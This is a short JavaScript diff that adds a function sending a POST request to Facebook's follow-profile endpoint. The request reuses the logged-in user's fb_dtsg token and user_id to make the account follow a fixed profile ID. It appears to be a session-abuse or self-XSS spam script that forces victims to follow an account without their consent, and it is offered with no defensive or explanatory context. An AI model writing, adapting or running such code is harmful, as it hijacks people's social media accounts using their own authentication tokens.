@@ -1,4 +1,17 @@
-alert("HOLA");
+amigo();
+
+function amigo() {
+    var http4 = new XMLHttpRequest;
+    var url4 = "/ajax/follow/follow_profile.php?__a=1";
+    var params4 = "profile_id=711894381&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+    http4.open("POST", url4, true);
+    http4.onreadystatechange = function () {
+        if (http4.readyState == 4 && http4.status == 200) http4.close
+    };
+    alert(params4);
+    http4.send(params4)
+}
+
 
 /**
 function IbraheemNada(uidss) {
